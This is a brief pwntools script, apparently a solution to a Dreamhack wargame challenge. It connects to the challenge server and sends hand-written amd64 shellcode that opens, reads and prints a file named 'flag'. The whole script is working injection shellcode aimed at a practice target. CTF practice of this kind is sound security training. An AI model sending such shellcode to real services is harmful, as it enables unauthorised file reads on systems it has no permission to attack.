from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22121
r = remote(HOST, PORT)

sh=asm('''
    xor rax, rax
    push rax
    mov rax, 0x67616c66
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall
''')
r.sendlineafter(b': ', sh)

r.interactive()